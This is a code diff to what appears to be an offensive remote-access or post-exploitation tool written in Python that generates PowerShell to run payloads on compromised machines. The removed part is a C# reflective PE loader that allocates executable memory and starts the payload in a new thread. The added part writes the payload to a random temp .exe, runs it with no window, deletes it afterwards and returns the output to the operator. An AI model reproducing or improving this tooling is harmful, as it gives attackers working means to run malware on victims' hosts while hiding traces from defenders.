@@ -340,75 +340,50 @@ try {{
 
         runpe_ps = f"""
 $p='{path}';$expected='{expected_hash}';$payloadArgs={ps_args}
-$result=@{{stdout='';stderr='';exit_code=0;method='runpe'}}
+$result=@{{stdout='';stderr='';exit_code=0;method='pe-memory-staged'}}
+$tmp=$null
 try {{
+  if(-not (Test-Path -LiteralPath $p)) {{ throw "Staging file not found: $p" }}
   $bytes=[IO.File]::ReadAllBytes($p)
   Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
   $hash=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLower()
-  if($hash -ne $expected) {{ $result.exit_code=1; $result.stderr='SHA256 verification failed' }}
-  else {{
-    $code=@'
-using System;using System.Runtime.InteropServices;using System.Text;
-public class RunPe {{
-  [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
-  [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr start,IntPtr p,uint f,IntPtr i);
-  public static bool Launch(byte[] data) {{
-    if(data.Length<64||data[0]!=0x4D||data[1]!=0x5A) return false;
-    int pe=BitConverter.ToInt32(data,0x3C);
-    if(pe+0x108>data.Length) return false;
-    ushort magic=BitConverter.ToUInt16(data,pe+0x18);
-    bool x64=magic==0x20B;
-    uint ep=BitConverter.ToUInt32(data,pe+0x18+(x64?0x10:0x10));
-    uint sz=BitConverter.ToUInt32(data,pe+0x18+(x64?0x38:0x38));
-    uint hdr=BitConverter.ToUInt32(data,pe+0x18+(x64?0x3C:0x3C));
-    IntPtr mem=VirtualAlloc(IntPtr.Zero,sz,0x3000,0x40);
-    if(mem==IntPtr.Zero) return false;
-    Marshal.Copy(data,0,mem,(int)Math.Min(hdr,data.Length));
-    ushort secs=BitConverter.ToUInt16(data,pe+6);
-    int secOff=pe+0x18+(x64?0x78:0x54);
-    for(int i=0;i<secs;i++) {{
-      int o=secOff+i*40;
-      uint va=BitConverter.ToUInt32(data,o+12);
-      uint rs=BitConverter.ToUInt32(data,o+16);
-      uint rp=BitConverter.ToUInt32(data,o+20);
-      if(rs>0&&rp+rs<=data.Length) Marshal.Copy(data,(int)rp,IntPtr.Add(mem,(int)va),(int)rs);
-    }}
-    CreateThread(IntPtr.Zero,0,IntPtr.Add(mem,(int)ep),IntPtr.Zero,0,IntPtr.Zero);
-    return true;
-  }}
-}}
-'@
-    Add-Type -TypeDefinition $code -Language CSharp -ErrorAction Stop | Out-Null
-    $ok=[RunPe]::Launch($bytes)
-    if($ok) {{ $result.stdout='PE launched in-memory via reflective loader' }}
-    else {{ throw 'Reflective PE load failed' }}
-  }}
-}} catch {{
-  $result.method='disk-fallback'
-  try {{
-    if(-not $bytes) {{ $bytes=[IO.File]::ReadAllBytes($p); Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue }}
+  if($hash -ne $expected) {{
+    $result.exit_code=1
+    $result.stderr='SHA256 verification failed'
+  }} else {{
     $tmp=[IO.Path]::Combine($env:TEMP,[IO.Path]::GetRandomFileName()+'.exe')
     [IO.File]::WriteAllBytes($tmp,$bytes)
+    $bytes=$null
     $psi=New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName=$tmp
     $psi.UseShellExecute=$false
     $psi.RedirectStandardOutput=$true
     $psi.RedirectStandardError=$true
-    if($payloadArgs.Count -gt 0) {{ $psi.Arguments=($payloadArgs -join ' ') }}
+    $psi.CreateNoWindow=$true
+    if($payloadArgs.Count -gt 0) {{
+      $argLine=($payloadArgs | ForEach-Object {{
+        $a=$_.ToString()
+        if($a -match '\\s') {{ '"' + ($a.Replace('"','`"')) + '"' }} else {{ $a }}
+      }}) -join ' '
+      $psi.Arguments=$argLine
+    }}
     $proc=[Diagnostics.Process]::Start($psi)
-    $stdout=$proc.StandardOutput.ReadToEnd()
-    $stderr=$proc.StandardError.ReadToEnd()
+    if(-not $proc) {{ throw 'Process.Start returned null' }}
+    $result.stdout=$proc.StandardOutput.ReadToEnd()
+    $result.stderr=$proc.StandardError.ReadToEnd()
     $proc.WaitForExit()
+    if(-not $proc.HasExited) {{ $proc.Kill(); $result.stderr+=' [process killed after timeout]' }}
     $result.exit_code=$proc.ExitCode
-    $result.stdout=$stdout
-    $result.stderr=$stderr
-    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
-  }} catch {{
-    $result.exit_code=1
-    $result.stderr=$_.Exception.Message
+  }}
+}} catch {{
+  $result.exit_code=1
+  $result.stderr=$_.Exception.Message
+}} finally {{
+  if($tmp -and (Test-Path -LiteralPath $tmp)) {{
+    Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
   }}
 }}
-'{mark_s}'+($result|ConvertTo-Json -Compress)+'{mark_e}'
+'{mark_s}'+($result | ConvertTo-Json -Compress -Depth 4)+'{mark_e}'
 """
         return None, runpe_ps.strip()
 
@@ -591,7 +566,8 @@ print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
             unix_cmd, _ = self._build_elf_exec(remote_path, digest, payload_args)
 
         print(f"{self.h.colors['yellow']}Executing {name} in memory...{self.h.colors['end']}")
-        result = self._run_exec_command(client_sock, unix_cmd, win_ps, shell_type)
+        exec_timeout = 600.0 if payload_type == 'pe' else 120.0
+        result = self._run_exec_command(client_sock, unix_cmd, win_ps, shell_type, timeout=exec_timeout)
         runtime_ms = int((time.time() - start_time) * 1000)
         success = bool(result) and result.get('exit_code') in (0, None)
         self._display_result(result, save_output=save_output)
